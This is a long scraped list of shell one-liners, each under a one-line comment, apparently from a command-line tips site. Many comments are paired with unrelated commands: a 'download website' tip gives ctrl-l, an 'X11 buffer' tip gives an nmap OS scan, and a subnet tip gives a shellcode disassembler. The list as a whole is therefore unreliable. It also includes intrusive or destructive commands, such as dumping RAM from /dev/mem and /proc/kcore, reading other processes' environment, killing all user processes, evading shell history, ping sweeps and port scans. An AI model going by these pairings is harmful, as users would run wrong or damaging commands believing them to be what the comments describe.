
# Run the last command as root
sudo !!
# Runs previous command but replacing
^foo^bar
# Rapidly invoke an editor to write a long, complex, or tricky command
ctrl-x e
# Place the argument of the most recent command on the shell
'ALT+.' or '<ESC> .'
# currently mounted filesystems in nice layout
mount | column -t
# Salvage a borked terminal
reset
# Get your external IP address
curl ifconfig.me
# Execute a command at a given time
echo "ls -l" | at midnight
# Quick access to the ascii table.
man ascii
# output your microphone to a remote computer's speaker
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
# type partial command, kill this command, check something you forgot, yank the command, resume typing.
<ctrl+u> [...] <ctrl+y>
# Query Wikipedia via console over DNS
dig +short txt <keyword>.wp.dg.cx
# Download an entire website
ctrl-l
# Compare a remote file with a local file
ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
# SSH connection through host in the middle
ssh -t reachable_host ssh unreachable_host
# A very simple and useful stopwatch
time read (ctrl-d to stop)
# Put a console clock in top right corner
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
# Make 'less' behave like 'tail -f'.
less +F somelogfile
# Close shell keeping all subprocess running
disown -a && exit
# 32 bits or 64 bits?
getconf LONG_BIT
# List of commands you use most often
history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
# Simulate typing
echo "You can simulate on-screen typing just like in the movies" | pv -qL 10
# Set audible alarm when an IP address comes online
ping -i 60 -a IP_address
# Reboot machine when everything is hanging
<alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
# quickly rename a file
mv filename.{old,new}
# Push your present working directory to a stack that you can pop later
pushd /tmp
# Display the top ten running processes - sorted by memory usage
ps aux | sort -nk +4 | tail
# Delete all files in a folder that don't match a certain file extension
rm !(*.foo|*.bar|*.baz)
# Watch Network Service Activity in Real-time
lsof -i
# escape any command aliases
\[command]
# Show apps that use internet connection at the moment. (Multi-Language)
lsof -P -i -n
# Reuse all parameter of the previous command line
!*
# Backticks are evil
echo "The date is: $(date +%D)"
# Sharing file through http 80 port
nc -v -l 80 < file.ext
# Display a block of text with AWK
awk '/start_pattern/,/stop_pattern/' file.txt
# Set CDPATH to ease navigation
CDPATH=:..:~:~/projects
# save command output to image
ifconfig | convert label:@- ip.png
# Add Password Protection to a file your editing in vim.
vim -x <FILENAME>
# Remove duplicate entries in a file without sorting.
awk '!x[$0]++' <file>
# Copy your SSH public key on a remote machine for passwordless login - the easy way
ssh-copy-id username@hostname
# Kills a process that is locking a file.
fuser -k filename
# python smtp server
python -m smtpd -n -c DebuggingServer localhost:1025
# Insert the last command without the last argument (bash)
!:-
# Display which distro is installed
cat /etc/issue
# Find the process you are looking for minus the grepped one
ps aux | grep [p]rocess-name
# Extract tarball from internet without local saving
ESC *
# replace spaces in filenames with underscores
rename 'y/ /_/' *
# Rapidly invoke an editor to write a long, complex, or tricky command
fc
# A fun thing to do with ram is actually open it up and take a peek. This command will show you all the string (plain text) values in ram
sudo dd if=/dev/mem | cat | strings
# intercept stdout/stderr of another process
strace -ff -e trace=write -e write=1,2 -p SOME_PID
# Define a quick calculator function
? () { echo "$*" | bc -l; }
# mkdir & cd into it as single command
mkdir /home/foo/doc/bar && cd $_
# Make directory including intermediate directories
mkdir -p a/long/directory/path
# Multiple variable assignments from command output in BASH
read day month year <<< $(date +'%d %m %y')
# Remove all but one specific file
rm -f !(survivior.txt)
# git remove files which have been deleted
git add -u
# Job Control
^Z $bg $disown
# Edit a file on a remote host using vim
vim scp://username@host//path/to/somefile
# Show apps that use internet connection at the moment. (Multi-Language)
ss -p
# Generate a random password 30 characters long
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
# Show numerical values for each of the 256 colors in bash
for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
# Recursively remove all empty directories
find . -type d -empty -delete
# Convert seconds to human-readable format
date -d@1234567890
# Get the 10 biggest files/folders for the current direcotry
du -s * | sort -n | tail
# Display a cool clock on your terminal
watch -t -n1 "date +%T|figlet"
# Processor / memory bandwidthd? in GB/s
dd if=/dev/zero of=/dev/null bs=1M count=32768
# pretend to be busy in office to enjoy a cup of coffee
cat /dev/urandom | hexdump -C | grep "ca fe"
# Makes the permissions of file2 the same as file1
chmod --reference file1 file2
# Nice weather forecast on your shell
curl wttr.in/seville
# Mount a .iso file in UNIX/Linux
mount /path/to/file.iso /mnt/cdrom -oloop
# Remove a line in a text file. Useful to fix
ssh-keygen -R <the_offending_host>
# To print a specific line from a file
sed -n 5p <file>
# Open Finder from the current Terminal location
open .
# Create a persistent connection to a machine
ssh -MNf <user>@<host>
# Start COMMAND, and kill it if still running after 5 seconds
timeout 5s COMMAND
# Attach screen over ssh
ssh -t remote_host screen -r
# Show a 4-way scrollable process tree with full details.
ps awwfux | less -S
# Run a command only when load average is below a certain threshold
echo "rm -rf /unwanted-but-large/folder" | batch
# Create a quick back-up copy of a file
cp file.txt{,.bak}
# List all bash shortcuts
bind -P
# Remove all files previously extracted from a tar(.gz) file.
tar -tf <file.tar.gz> | xargs rm -r
# Eavesdrop on your system
diff <(lsof -p 1234) <(sleep 10; lsof -p 1234)
# directly ssh to host B that is only accessible through host A
ssh -t hostA ssh hostB
# Retry the previous command until it exits successfully
until !!; do :; done
# What is my public IP-address?
curl ifconfig.me
# Run a file system check on your next boot.
sudo touch /forcefsck
# List only the directories
ls -d */
# Share a terminal screen with others
% screen -r someuser/
# Synchronize date and time with a server over ssh
date --set="$(ssh user@server date)"
# Binary Clock
watch -n 1 'echo "obase=2;`date +%s`" | bc'
# Get your outgoing IP address
dig +short myip.opendns.com @resolver1.opendns.com
# Compare two directory trees.
diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
# Bring the word under the cursor on the :ex line in Vim
:<C-R><C-W>
# Remind yourself to leave in 15 minutes
leave +15
# make directory tree
mkdir -p work/{d1,d2}/{src,bin,bak}
# Download all images from a site
grep ^Dirty /proc/meminfo
# Use tee to process a pipe with two or more processes
echo "tee can split a pipe in two"|tee >(rev) >(tr ' ' '_')
# Show apps that use internet connection at the moment.
lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2
# Add timestamp to history
export HISTTIMEFORMAT="%F %T "
# Find files that have been modified on your system in the past 60 minutes
sudo find / -mmin 60 -type f
# using `!#$' to referance backward-word
cp /work/host/phone/ui/main.cpp !#$:s/host/target
# Quick access to ASCII code of a key
showkey -a
# find files in a date range
find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
# Control ssh connection
[enter]~?
# run complex remote shell cmds over ssh, without escaping quotes
ssh host -l user $(<cmd.txt)
# Create a directory and change into it at the same time
md () { mkdir -p "$@" && cd "$@"; }
# Colorized grep in less
grep --color=always | less -R
# Exclude multiple columns using AWK
awk '{$1=$3=""}1' file
# ls not pattern
ls !(*.gz)
# output your microphone to a remote computer's speaker
arecord -f dat | ssh -C user@host aplay -f dat
# analyze traffic remotely over ssh w/ wireshark
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -
# Remove a line in a text file. Useful to fix "ssh host key change" warnings
sed -i 8d ~/.ssh/known_hosts
# Save a file you edited in vim without the needed permissions (no echo)
:w !sudo tee > /dev/null %
# Remove blank lines from a file using grep and save output to new file
grep . filename > newfilename
# delete a line from your shell history
history -d
# Get the IP of the host your coming from when logged in remotely
echo ${SSH_CLIENT%% *}
# Random Number Between 1 And X
echo $[RANDOM%X+1]
# Lists all listening ports together with the PID of the associated process
lsof -Pan -i tcp -i udp
# easily find megabyte eating files or directories
alias dush="du -sm *|sort -n|tail"
# exit without saving history
kill -9 $$
# How to establish a remote Gnu screen session that you can re-connect to
ssh -t user@some.domain.com /usr/bin/screen -xRR
# Find usb device
diff <(lsusb) <(sleep 3s && lsusb)
# find all file larger than 500M
find / -type f -size +500M
# notify yourself when a long-running command which has ALREADY STARTED is finished
<ctrl+z> fg; notify_me
# Create colorized html file from Vim or Vimdiff
:TOhtml
# live ssh network throughput test
yes | pv | ssh $host "cat > /dev/null"
# Create a nifty overview of the hardware in your computer
lshw -html > hardware.html
# Save your sessions in vim to resume later
:mksession! <filename>
# Bind a key with a command
bind -x '"\C-l":ls -l'
# Take screenshot through SSH
DISPLAY=:0.0 import -window root /tmp/shot.png
# intersection between two files
grep -Fx -f file1 file2
# prints line numbers
nl
# convert unixtime to human-readable
date -d @1234567890
# A fun thing to do with ram is actually open it up and take a peek. This command will show you all the string (plain text) values in ram
sudo strings /dev/mem
# Diff on two variables
diff <(echo "$a") <(echo "$b")
# Convert seconds into minutes and seconds
bc <<< 'obase=60;299'
# Alias HEAD for automatic smart output
alias head='head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))'
# Pipe stdout and stderr, etc., to separate commands
some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
# runs a bash script in debugging mode
bash -x ./post_to_commandlinefu.sh
# Instead of writing a multiline if/then/else/fi construct you can do that by one line
[[ test_condition ]] && if_true_do_this || otherwise_do_that
# A child process which survives the parent's death (for sure)
( command & )
# prevent accidents while using wildcards
rm *.txt <TAB> <TAB>
# Opens vi/vim at pattern in file
vi +/pattern [file]
# send echo to socket network
echo "foo" > /dev/tcp/192.168.1.2/25
# Schedule a script or command in x num hours, silently run in the background even if logged out
( ( sleep 2h; your-command your-args ) & )
# Go to parent directory of filename edited in last command
cd !$:h
# Make anything more awesome
command | figlet
# List all files opened by a particular command
lsof -c dhcpd
# Nicely display permissions in octal format with filename
stat -c '%A %a %n' *
# Gets a random Futurama quote from /.
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
# Create a single-use TCP (or UDP) proxy
nc -l -p 2000 -c "nc example.org 3000"
# Switch 2 characters on a command line.
ctrl-t
# List the number and type of active network connections
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
# Use file(1) to view device information
file -s /dev/sd*
# exclude a column with cut
cut -f5 --complement
# Insert  the  last  argument  of  the previous command
<ESC> .
# Press Any Key to Continue
read -sn 1 -p "Press any key to continue..."
# Remove color codes (special characters) with sed
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
# throttle bandwidth with cstream
tar -cj /backup | cstream -t 777k | ssh host 'tar -xj -C /backup'
# When feeling down, this command helps
sl
# format txt as table not joining empty columns
column -tns: /etc/passwd
# Bind a key with a command
bind '"\C-l":"ls -l\n"'
# Recover a deleted file
grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
# List files with quotes around each filename
ls -Q
# Duplicate several drives concurrently
dd if=/dev/sda | tee >(dd of=/dev/sdb) | dd of=/dev/sdc
# Execute a command with a timeout
timeout 10 sleep 11
# find files containing text
grep -lir "some text" *
# Quickly graph a list of numbers
gnuplot -persist <(echo "plot '<(sort -n listOfNumbers.txt)' with lines")
# Perform a branching conditional
true && { echo success;} || { echo failed; }
# Use tee + process substitution to split STDOUT to multiple commands
some_command | tee >(command1) >(command2) >(command3) ... | command4
# Analyse an Apache access log for the most common IP addresses
tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
# Annotate tail -f with timestamps
tail -f file | while read; do echo "$(date +%T.%N) $REPLY"; done
# Create strong, but easy to remember password
read -s pass; echo $pass | md5sum | base64 | cut -c -16
# Fast, built-in pipe-based data sink
<COMMAND> |:
# Generate an XKCD #936 style 4 word password
shuf -n4 /usr/share/dict/words | tr -d '\n'
# Repoint an existing symlink to a new location
ln -nsf <TARGET> <LINK>
# Diff remote webpages using wget
diff <(wget -q -O - URL1) <(wget -q -O - URL2)
# Close a hanging ssh session
~.
# processes per user counter
ps hax -o user | sort | uniq -c
# convert filenames in current directory to lowercase
rename 'y/A-Z/a-z/' *
# Find files that were modified by a given command
touch /tmp/file ; $EXECUTECOMMAND ; find /path -newer /tmp/file
# Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string'
tr : '\n' <<<$PATH
# List of commands you use most often
history | awk '{print $2}' | sort | uniq -c | sort -rn | head
# Efficiently print a line deep in a huge log file
sed '1000000!d;q' < massive-log-file.log
# prevent large files from being cached in memory (backups!)
nocache <I/O-heavy-command>
# Check if system is 32bit or 64bit
getconf LONG_BIT
# dmesg with colored human-readable dates
dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
# convert single digit to double digits
for i in ?.ogg; do mv $i 0$i; done
# List alive hosts in specific subnet
nmap -sP 192.168.1.0/24
# Make sure a script is run in a terminal.
[ -t 0 ] || exit 1
# pipe output of a command to your clipboard
some command|xsel --clipboard
# Find broken symlinks and delete them
find -L /path/to/check -type l -delete
# ls -hog --> a more compact ls -l
ls -hog
# git remove files which have been deleted
git rm $(git ls-files --deleted)
# Create a local compressed tarball from remote host directory
ssh user@host "tar -zcf - /path/to/dir" > dir.tar.gz
# Rapidly invoke an editor to write a long, complex, or tricky command
<ESC> v or ctrl-x ctrl-e
# df without line wrap on long FS name
df -P | column -t
# send a circular
wall <<< "Broadcast This"
# bash: hotkey to put current commandline to text-editor
bash-hotkey: <CTRL+x+e>
# Show current working directory of a process
pwdx pid
# Have an ssh session open forever
diff -urp /originaldirectory /modifieddirectory
# Base conversions with bc
echo "obase=2; 27" | bc -l
# Put readline into vi mode
set -o vi
# Transfer SSH public key to another machine in one step
ssh-keygen; ssh-copy-id user@host; ssh user@host
# convert uppercase files to lowercase files
rename 'y/A-Z/a-z/' *
# return external ip
curl ipinfo.io
# Simple multi-user encrypted chat server for 5 users
ncat -vlm 5 --ssl --chat 9876
# Check if your ISP is intercepting DNS queries
dig +short which.opendns.com txt @208.67.220.220
# Remove a range of lines from a file
sed -i <file> -re '<start>,<end>d'
# Create a file server, listening in port 7000
while true; do nc -l 7000 | tar -xvf -; done
# bypass any aliases and functions for the command
\foo
# Share your terminal session real-time
mkfifo foo; script -f foo
# stderr in color
mycommand 2> >(while read line; do echo -e "\e[01;31m$line\e[0m"; done)
# Delete all empty lines from a file with vim
:g/^$/d
# Using awk to sum/count a column of numbers.
cat count.txt | awk '{ sum+=$1} END {print sum}'
# Get all the keyboard shortcuts in screen
^A ?
# Get list of servers with a specific port open
nmap -sT -p 80 -oG - 192.168.1.* | grep open
# Notepad in a browser (type this in the URL bar)
data:text/html, <html contenteditable>
# cat a bunch of small files with file indication
grep . *
# send a circular
echo "dear admin, please ban eribsskog" | wall
# Remote screenshot
DISPLAY=":0.0" import -window root screenshot.png
# List all authors of a particular git project
git log --format='%aN' | sort -u
# Harder, Faster, Stronger SSH clients
ssh -4 -C -c blowfish-cbc
# Pretty Print a simple csv in the command line
column -s, -t <tmp.csv
# check open ports
lsof -Pni4 | grep LISTEN
# Create a list of binary numbers
echo {0..1}{0..1}{0..1}{0..1}
# Create a system overview dashboard on F12 key
bind '"\e[24~"':"\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\C-m"""
# Relocate a file or directory, but keep it accessible on the old location throug a simlink.
mv $1 $2 && ln -s $2/$(basename $1) $(dirname $1)
# disable history for current shell session
unset HISTFILE
# a short counter
yes '' | cat -n
# Rsync remote data as root using sudo
rsync --rsync-path 'sudo rsync' username@source:/folder/ /local/
# Pipe STDOUT to vim
tail -1000 /some/file | vim -
# Copy stdin to your X11 buffer
nmap -sS -P0 -sV -O <target>
# Get http headers for an url
curl -I www.commandlinefu.com
# random git-commit message
vi scp://username@host//path/to/somefile
# convert from hexidecimal or octal to decimal
echo $((0x1fe)) $((033))
# Convert seconds into minutes and seconds
echo 'obase=60;299' | bc
# List by size all of the directories in a given tree.
du -h /path | sort -h
# Visit wikileaks.com
echo 213.251.145.96 wikileaks.com >>/etc/hosts
# Make sudo forget password instantly
sudo -K
# Quickly share code or text from vim to others.
printf "%`tput cols`s"|tr ' ' '#'
# download and unpack tarball without leaving it sitting on your hard drive
tar cf - <dir>|split -b<max_size>M - <name>.tar.
# More precise BASH debugging
env PS4=' ${BASH_SOURCE}:${LINENO}(${FUNCNAME[0]}) ' sh -x /etc/profile
# clear current line
CTRL+u
# Quickly generate an MD5 hash for a text string using OpenSSL
echo -n 'text to be encrypted' | openssl md5
# Terminate a frozen SSH-session
RETURN~.
# Download an entire static website to your local machine
wget --recursive  --page-requisites --convert-links www.moyagraphix.co.za
# Count files beneath current directory (including subfolders)
find . -type f | wc -l
# Check if system is 32bit or 64bit
namei -m $(pwd)
# move you up one directory quickly
shopt -s autocd
# Remove a line from a file using sed (useful for updating known SSH server keys when they change)
ssh-keygen -R <thehost>
# Show what PID is listening on port 80 on Linux
fuser -v 80/tcp
# Short and elegant way to backup a single file before you change it.
cp httpd.conf{,.bk}
# Find the most recently changed files (recursively)
find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort
# Figure out what shell you're running
echo $0
# Download a file and uncompress it while it downloads
du -hs */ | sort -hr | head
# Rename all .jpeg and .JPG files to have .jpg extension
rename 's/\.jpe?g$/.jpg/i' *
# Generate a Random MAC address
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
# Remove Thumbs.db files from folders
find ./ -name Thumbs.db -delete
# List open files that have no links to them on the filesystem
lsof +L1
# Copy an element from the previous command
!:1-3
# View user activity per directory.
sudo lsof -u someuser -a +D /etc
# use the previous commands params in the current command
!!:[position]
# Tune your guitar from the command line.
for n in E2 A2 D3 G3 B3 E4;do play -n synth 4 pluck $n repeat 2;done
# Clean your broken terminal
stty sane
# grep -v with multiple patterns.
grep 'test' somefile | grep -vE '(error|critical|warning)'
# Identify long lines in a file
awk 'length>72' file
# Use all the cores or CPUs when compiling
make -j 4
# Analyze awk fields
awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
# Find if the command has an alias
type -all command
# Find last reboot time
who -b
# Show a config file without comments
egrep -v "^$|^[[:space:]]*#" /etc/some/file
# Start screen in detached mode
screen -d -m [<command>]
# create dir tree
mkdir -p doc/{text/,img/{wallpaper/,photos/}}
# Delete all empty lines from a file with vim
:g!/\S/d
# List the files any process is using
lsof +p xxxx
# change directory to actual path instead of symlink path
cd `pwd -P`
# Use top to monitor only all processes with the same name fragment 'foo'
top -p $(pgrep -d , foo)
# delete command line last word
ctrl+w
# Color man pages
echo "export LESS_TERMCAP_mb=$'\E[01;31m'" >> ~/.bashrc
# What is the use of this switch ?
manswitch () { man $1 | less -p "^ +$2"; }
# Save the list of all available commands in your box to a file
cd <directory>; touch ./-i
# Rapidly invoke an editor to write a long, complex, or tricky command
<ESC> v
# Reuse last parameter
!$
# Blink LED Port of NIC Card
ethtool -p eth0
# See where a shortened url takes you before click
check(){ curl -sI $1 | sed -n 's/Location: *//p';}
# Running scripts after a reboot for non-root users .
@reboot <yourscript.sh>
# run command on a group of nodes in parallel
echo "uptime" | pee "ssh host1" "ssh host2" "ssh host3"
# make, or run a script, everytime a file in a directory is modified
while true; do inotifywait -r -e MODIFY dir/ && make; done;
# Convert a Nero Image File to ISO
dd bs=1k if=image.nrg of=image.iso skip=300
# View network activity of any application or user in realtime
lsof -r 2 -p PID -i -a
# generate random password
pwgen -Bs 10 1
# Show directories in the PATH, one per line
echo $PATH | tr \: \\n
# Follow tail by name (fix for rolling logs with tail -f)
tail -F file
# Convert "man page" to text file
man ls | col -b > ~/Desktop/man_ls.txt
# Given process ID print its environment variables
sed 's/\o0/\n/g' /proc/INSERT_PID_HERE/environ
# restoring some data from a corrupted text file
( cat badfile.log ; tac badfile.log | tac ) > goodfile.log
# view the system console remotely
sudo cat /dev/vcs1 | fold -w 80
# Ctrl+S Ctrl+Q terminal output lock and unlock
Ctrl+S Ctrl+Q
# Redirect STDIN
< /path/to/file.txt grep foo
# Browse system RAM in a human readable form
sudo cat /proc/kcore | strings | awk 'length > 20' | less
# Backup your hard drive with dd
sudo dd if=/dev/sda of=/media/disk/backup/sda.backup
# Add forgotten changes to the last git commit
git commit --amend
# Calculates the date 2 weeks ago from Saturday the specified format.
date -d '2 weeks ago Saturday' +%Y-%m-%d
# Get Cisco network information
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
# Press ctrl+r in a bash shell and type a few letters of a previous command
last  | grep -v "^$" | awk '{ print $1 }' | sort -nr | uniq -c
# Get Dell Service Tag Number from a Dell Machine
nmap -sP 192.168.1.100-254
# Use last argument of last command
file !$
# Determine if a port is open with bash
: </dev/tcp/127.0.0.1/80
# Download all mp3's listed in an html page
wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]
# Swap the two last arguments of the current command line
<ctrl+e> <esc+t>
# sort the output of the 'du' command by largest first, using human readable output.
du -h --max-depth=1 |sort -rh
# Ask for a password, the passwd-style
read -s -p"Password: " USER_PASSWORD_VARIABLE; echo
# monitor memory usage
watch vmstat -sSM
# Timer with sound alarm
sleep 3s && espeak "wake up, you bastard" 2>/dev/null
# run command on a group of nodes in parallel
echo "uptime" | tee >(ssh host1) >(ssh host2) >(ssh host3)
# Ping scanning without nmap
for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done
# Replace spaces in filenames with underscores
rename -v 's/ /_/g' *
# Show directories in the PATH, one per line
echo "${PATH//:/$'\n'}"
# move a lot of files over ssh
rsync -az /home/user/test user@sshServer:/tmp/
# Validate and pretty-print JSON expressions.
echo '{"json":"obj"}' | python -m simplejson.tool
# Monitor TCP opened connections
watch -n 1 "netstat -tpanl | grep ESTABLISHED"
# Fix Ubuntu's Broken Sound Server
sudo killall -9 pulseaudio; pulseaudio >/dev/null 2>&1 &
# Download all Delicious bookmarks
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
# Fibonacci numbers with awk
seq 50| awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'
# Check Ram Speed and Type in Linux
sort -nt . -k 1,1 -k 2,2 -k 3,3 -k 4,4
# Add your public SSH key to a server in one command
cat .ssh/id_rsa.pub | ssh hostname 'cat >> .ssh/authorized_keys'
# Select rectangular screen area
Ctrl + Alt
# grep processes list avoiding the grep itself
ps axu | grep [a]pache2
# Daemonize nc - Transmit a file like a http server
while ( nc -l 80 < /file.htm > : ) ; do : ; done &
# tail a log over ssh
ssh -t remotebox "tail -f /var/log/remote.log"
# Query well known ports list
getent services <<service>>
# Discovering all open files/dirs underneath a directory
lsof +D <dirname>
# Compare copies of a file with md5
cmp file1 file2
# analyze traffic remotely over ssh w/ wireshark
ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -
# Find all active ip's in a subnet
echo -ne "<shellcode>" | x86dis -e 0 -s intel
# List bash functions defined in .bash_profile or .bashrc
screen -raAd
# Change pidgin status
^W-L
# Sort all running processes by their memory & CPU usage
ps aux --sort=%mem,%cpu
# Change user, assume environment, stay in current dir
su -- user
# List Network Tools in Linux
apropos network |more
# Save current layout of top
<Shift + W>
# An easter egg built into python to give you the Zen of Python
python -c 'import this'
# Salvage a borked terminal
<ctrl+j>stty sane<ctrl+j>
# urldecoding
sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' | xargs echo -e
# Share a 'screen'-session
screen -x
# Show all detected mountable Drives/Partitions/BlockDevices
hwinfo --block --short
# Append stdout and stderr to a file, and print stderr to the screen [bash]
somecommand 2>&1 >> logfile | tee -a logfile
# quickly change all .html extensions on files in folder to .htm
for i in *.html ; do mv $i ${i%.html}.htm ; done
# Delete the specified line
sed -i 8d ~/.ssh/known_hosts
# Read the output of a command into the buffer in vim
:r !command
# find process associated with a port
fuser [portnumber]/[proto]
# scping files with streamlines compression (tar gzip)
tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination
# Using a single sudo to run multiple && arguments
sudo -s <<< 'apt update -y && apt upgrade -y'
# Show how old your linux OS installtion is
ps -eo pid,lstart,cmd
# True Random Dice Roll
tr -cd '1-6' < /dev/urandom | head -c 1; echo
# This is how you should push a string in a command's stdin.
command <<< word
# what model of computer I'm using?
awk '{gsub("foo","bar",$5)}1' file
# Substrings a variable
var='123456789'; echo ${var:<start_pos>:<offset>}
# One command line web server on port 80 using nc (netcat)
while true ; do nc -l 80  < index.html ; done
# Numeric zero padding file rename
rename 's/\d+/sprintf("%04d",$&)/e' *.jpg
# Find out the starting directory of a script
echo "${0%/*}"
# Selecting a random file/folder of a folder
shuf -n1 -e *
# add the result of a command into vi
!!command
# Place the NUM-th argument of the most recent command on the shell
<ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>
# Ask user to confirm
Confirm() { read -sn 1 -p "$1 [Y/N]? "; [[ $REPLY = [Yy] ]]; }
# Random unsigned integer
echo $(openssl rand 4 | od -DAn)
# kill all process that belongs to you
kill -9 -1
# Make a file not writable / immutable by root
sudo chattr +i <file>
# Continue a current job in the background
<ctrl+z> bg
# Print just line 4 from a textfile
sed -n '4{p;q}'
# Print just line 4 from a textfile
sed -n '4p'
# lines in file2 that are not in file1
grep -Fxv -f file1 file2
# Do some learning...
ls /usr/bin | xargs whatis | grep -v nothing | less
# Insert  the  last  argument  of  the previous command
<ALT> .
# Carriage return for reprinting on the same line
while true; do echo -ne "$(date)\r"; sleep 1; done
# command line calculator
calc(){ awk "BEGIN{ print $* }" ;}
# Backup a local drive into a file on the remote host via ssh
dd if=/dev/sda | ssh user@server 'dd of=sda.img'
# Print text string vertically, one character per line.
echo "vertical text" | grep -o '.'
# Add prefix onto filenames
rename 's/^/prefix/' *
# Pick a random line from a file
shuf -n1 file.txt
# Find removed files still in use via /proc
find -L /proc/*/fd -links 0 2>/dev/null
# List and delete files older than one year
find <directory path> -mtime +365 -and -not -type d -delete
# wrap long lines of a text
fold -s -w 90 file.txt
# Grep colorized
grep -i --color=auto
# from within vi, pipe a chunk of lines to a command line and replace the chunk with the result
!}sort
# Grep for word in directory (recursive)
alias timestamp='date "+%Y%m%dT%H%M%S"'
# Files extension change
rename .oldextension .newextension *.oldextension
# pattern match in awk - no grep
awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'
# Run entire shell script as root
#!/usr/bin/sudo /bin/bash
# Optimal way of deleting huge numbers of files
rsync -a --delete empty-dir/ target-dir/
# quick copy
cp foo{,bak}
# Kill a broken ssh connection
<Return>~.
# Convert Shell Text to Upper/Lower Case
ALT-U / ALT-L
# open two files side by side in vim (one window, two panes)
vim -O file1 file2
# repeat a command every one second
watch -n 1 "do foo"
# Recursively find top 20 largest files (> 1MB) sort human readable format
find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
# open a screenshot of a remote desktop via ssh
cat /proc/PID/limits
# diff current vi buffer edits against original file
:w !diff -u % -
# Redirect  tar extract to another directory
tar xfz filename.tar.gz -C PathToDirectory
# Generate a random password 30 characters long
gpg --gen-random --armor 1 30
# all out
pkill -KILL -u username
# List your MACs address
lsmac() { ifconfig -a | sed '/eth\|wl/!d;s/   Link.*HWaddr//' ; }
# ssh to machine behind shared NAT
ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com
# list all file extensions in a directory
find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g
# Send an http HEAD request w/curl
:%!xxd
# View ~/.ssh/known_hosts key information
ssh-keygen -l -f ~/.ssh/known_hosts
# Kill all Zombie processes (Guaranteed!)
kill -9 `ps -xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'`
# prevent accidents and test your command with echo
echo rm *.txt
# exclude a column with awk
awk '{ $5=""; print }' file
# Get My Public IP Address
curl ifconfig.me
# pretend to be busy in office to enjoy a cup of coffee
for i in `seq 0 100`;do timeout 6 dialog --gauge "Install..." 6 40 "$i";done
# Empty a file
:> file
# Emptying a text file in one shot
:%d
# live ssh network throughput test
pv /dev/zero|ssh $host 'cat > /dev/null'
# Optimal way of deleting huge numbers of files
find /path/to/dir -type f -delete
# Remove lines that contain a specific pattern($1) from file($2).
sed -i '/myexpression/d' /path/to/file.txt
# List your largest installed packages (on Debian/Ubuntu)
tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -'
# vim easter egg
$ vim ... :help 42
# Find the process you are looking for minus the grepped one
pgrep command_name
# currently mounted filesystems in nice layout
column -t /proc/mounts
# Salvage a borked terminal
echo <ctrl-v><esc>c<enter>
# VIM: Replace a string with an incrementing number between marks 'a and 'b (eg, convert string ZZZZ to 1, 2, 3, ...)
:let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1
# Get the canonical, absolute path given a relative and/or noncanonical path
readlink -f ../super/symlink_bon/ahoy
# Create a Multi-Part Archive Without Proprietary Junkware
tar czv Pictures | split -d -a 3 -b 16M - pics.tar.gz.
# Display last exit status of a command
echo $?
# Enable ** to expand files recursively (>=bash-4.0)
shopt -s globstar
# Delete all files found in directory A from directory B
for file in <directory A>/*; do rm <directory B>/`basename $file`; done
# Command Line to Get the Stock Quote via Yahoo
sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt
# Set your profile so that you resume or start a screen session on login
echo "screen -DR" >> ~/.bash_profile
# Create directory named after current date
mkdir $(date +%Y%m%d)
# Monitor dynamic changes in the dmesg log.
watch "dmesg |tail -15"
# find the process that is using a certain port e.g. port 3000
lsof -P | grep ':3000'
# Pause Current Thread
ctrl-z
# Create a bunch of dummy files for testing
touch {1..10}.txt
# Shows size of dirs and files, hidden or not, sorted.
du -cs * .[^\.]* | sort -n
# Find distro name and/or version/release
cat /etc/*-release
# Generate Random Passwords
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6
# Tells which group you DON'T belong to (opposite of command "groups") --- uses sed
sed -e "/$USER/d;s/:.*//g" /etc/group | sed -e :a -e '/$/N;s/\n/ /;ta'
# Quickly get summary of sizes for files and folders
du -sh *
# Block an IP address from connecting to a server
iptables -A INPUT -s 222.35.138.25/32 -j DROP
